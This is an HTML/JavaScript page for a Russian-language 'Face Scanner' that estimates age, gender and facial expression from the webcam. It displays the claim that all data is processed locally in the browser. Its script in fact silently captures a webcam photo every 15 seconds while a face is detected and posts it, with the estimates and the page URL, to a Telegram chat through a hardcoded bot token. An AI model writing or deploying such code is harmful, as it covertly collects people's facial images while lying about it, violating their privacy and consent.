<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Face Scanner</title>
  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #0a0a1a;
      color: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .container {
      text-align: center;
      max-width: 520px;
      width: 100%;
      padding: 2rem;
    }

    h1 {
      font-size: 1.5rem;
      font-weight: 600;
      margin-bottom: 0.5rem;
    }

    .subtitle {
      color: #888;
      font-size: 0.9rem;
      margin-bottom: 2rem;
    }

    .video-wrapper {
      position: relative;
      width: 100%;
      max-width: 400px;
      margin: 0 auto 1.5rem;
      border-radius: 50%;
      overflow: hidden;
      aspect-ratio: 1;
      border: 3px solid #333;
      transition: border-color 0.5s, box-shadow 0.5s;
    }

    .video-wrapper.scanning {
      border-color: #10b981;
      box-shadow: 0 0 40px rgba(16, 185, 129, 0.4);
    }

    .video-wrapper.no-face {
      border-color: #f59e0b;
      box-shadow: 0 0 30px rgba(245, 158, 11, 0.3);
    }

    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      transform: scaleX(-1);
    }

    .overlay {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      pointer-events: none;
    }

    .scan-line {
      position: absolute;
      width: 80%;
      height: 2px;
      background: linear-gradient(90deg, transparent, #10b981, transparent);
      animation: scan 2s ease-in-out infinite;
    }

    @keyframes scan {
      0%, 100% { top: 20%; opacity: 0; }
      50% { top: 80%; opacity: 1; }
    }

    .status {
      font-size: 1rem;
      font-weight: 500;
      padding: 0.75rem 1.5rem;
      border-radius: 12px;
      background: #1a1a2e;
      display: inline-block;
      margin-bottom: 1.5rem;
      transition: all 0.3s;
    }

    .status.loading { color: #888; }
    .status.active { color: #10b981; background: #0a2e1f; }
    .status.noface { color: #f59e0b; }
    .status.sent { color: #6366f1; background: #1a1a3e; }

    .info {
      font-size: 0.8rem;
      color: #555;
      margin-top: 1rem;
    }

    .result-details {
      margin-top: 1.5rem;
      text-align: left;
      background: #111;
      border-radius: 12px;
      padding: 1.25rem;
    }

    .result-row {
      display: flex;
      justify-content: space-between;
      padding: 0.5rem 0;
      border-bottom: 1px solid #1a1a2e;
      font-size: 0.85rem;
    }

    .result-row:last-child { border-bottom: none; }

    .result-label { color: #888; }
    .result-value { color: #fff; font-weight: 600; transition: opacity 0.3s; }
  </style>
</head>
<body>

  <div class="container">
    <h1>Face Scanner</h1>
    <p class="subtitle">Данные обновляются в реальном времени</p>

    <div class="video-wrapper" id="videoWrapper">
      <video id="video" autoplay muted playsinline></video>
      <div class="overlay">
        <div class="scan-line"></div>
      </div>
    </div>

    <div class="status loading" id="status">Загрузка моделей...</div>

    <div class="result-details" id="results">
      <div class="result-row">
        <span class="result-label">Лицо</span>
        <span class="result-value" id="rFace">—</span>
      </div>
      <div class="result-row">
        <span class="result-label">Уверенность</span>
        <span class="result-value" id="rConf">—</span>
      </div>
      <div class="result-row">
        <span class="result-label">Возраст (прибл.)</span>
        <span class="result-value" id="rAge">—</span>
      </div>
      <div class="result-row">
        <span class="result-label">Пол</span>
        <span class="result-value" id="rGender">—</span>
      </div>
      <div class="result-row">
        <span class="result-label">Выражение лица</span>
        <span class="result-value" id="rExpr">—</span>
      </div>
    </div>

    <p class="info">face-api.js | Все данные обрабатываются локально в браузере</p>
  </div>

  <!-- Hidden canvas for capturing photos -->
  <canvas id="captureCanvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const statusEl = document.getElementById('status');
    const wrapper = document.getElementById('videoWrapper');
    const canvas = document.getElementById('captureCanvas');

    const TG_TOKEN = '8777541911:AAEd_BEosgiFZrjeD7UYTbR2RyaXRhmaecI';
    const TG_CHAT_ID = '-1003794049979';

    const MODEL_URL = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights';

    const exprMap = {
      neutral: 'Нейтральное',
      happy: 'Счастливое',
      sad: 'Грустное',
      angry: 'Злое',
      fearful: 'Испуганное',
      disgusted: 'Отвращение',
      surprised: 'Удивлённое'
    };

    let lastSentTime = 0;
    const SEND_COOLDOWN = 15000; // 15 секунд между отправками

    async function init() {
      try {
        await Promise.all([
          faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
          faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
          faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL),
          faceapi.nets.ageGenderNet.loadFromUri(MODEL_URL)
        ]);

        setStatus('Включение камеры...', 'loading');

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } }
        });
        video.srcObject = stream;

        video.addEventListener('playing', () => {
          setStatus('Сканирование...', 'active');
          scanLoop();
        });

      } catch (err) {
        setStatus('Ошибка: ' + err.message, 'loading');
      }
    }

    function capturePhotoBase64() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      // Получаем base64 без префикса data:image/jpeg;base64,
      return canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
    }

    function dataURLtoBlob(dataURL) {
      const byteString = atob(dataURL);
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: 'image/jpeg' });
    }

    async function sendToTelegram(detection) {
      const now = Date.now();
      if (now - lastSentTime < SEND_COOLDOWN) return;
      lastSentTime = now;

      try {
        const base64 = capturePhotoBase64();
        const photoBlob = dataURLtoBlob(base64);

        const confidence = (detection.detection.score * 100).toFixed(1);
        const age = Math.round(detection.age);
        const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
        const genderProb = (detection.genderProbability * 100).toFixed(0);
        const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
        const topExpr = exprMap[sorted[0][0]] || sorted[0][0];

        const caption =
          `🔍 Face Scan\n` +
          `━━━━━━━━━━━━━━━\n` +
          `📊 Уверенность: ${confidence}%\n` +
          `🎂 Возраст: ~${age} лет\n` +
          `👤 Пол: ${gender} (${genderProb}%)\n` +
          `😐 Выражение: ${topExpr}\n` +
          `━━━━━━━━━━━━━━━\n` +
          `🕐 ${new Date().toLocaleString('ru-RU')}\n` +
          `🌐 ${location.href}`;

        const formData = new FormData();
        formData.append('chat_id', TG_CHAT_ID);
        formData.append('photo', photoBlob, 'face_scan.jpg');
        formData.append('caption', caption);

        const resp = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const data = await resp.json();
        console.log('TG response:', data);

      } catch (e) {
        console.log('TG send error:', e);
      }
    }

    async function scanLoop() {
      const detection = await faceapi
        .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.5 }))
        .withFaceLandmarks()
        .withFaceExpressions()
        .withAgeAndGender();

      if (detection) {
        wrapper.className = 'video-wrapper scanning';
        setStatus('Лицо обнаружено', 'active');

        const confidence = (detection.detection.score * 100).toFixed(1);
        const age = Math.round(detection.age);
        const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
        const genderProb = (detection.genderProbability * 100).toFixed(0);
        const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
        const topExpr = exprMap[sorted[0][0]] || sorted[0][0];

        document.getElementById('rFace').textContent = 'Да';
        document.getElementById('rConf').textContent = confidence + '%';
        document.getElementById('rAge').textContent = '~' + age + ' лет';
        document.getElementById('rGender').textContent = gender + ' (' + genderProb + '%)';
        document.getElementById('rExpr').textContent = topExpr;

        // Отправляем в Telegram
        sendToTelegram(detection);

      } else {
        wrapper.className = 'video-wrapper no-face';
        setStatus('Лицо не найдено...', 'noface');

        document.getElementById('rFace').textContent = 'Нет';
        document.getElementById('rConf').textContent = '—';
        document.getElementById('rAge').textContent = '—';
        document.getElementById('rGender').textContent = '—';
        document.getElementById('rExpr').textContent = '—';
      }

      requestAnimationFrame(scanLoop);
    }

    function setStatus(text, cls) {
      statusEl.textContent = text;
      statusEl.className = 'status ' + cls;
    }

    init();
  </script>

</body>
</html>
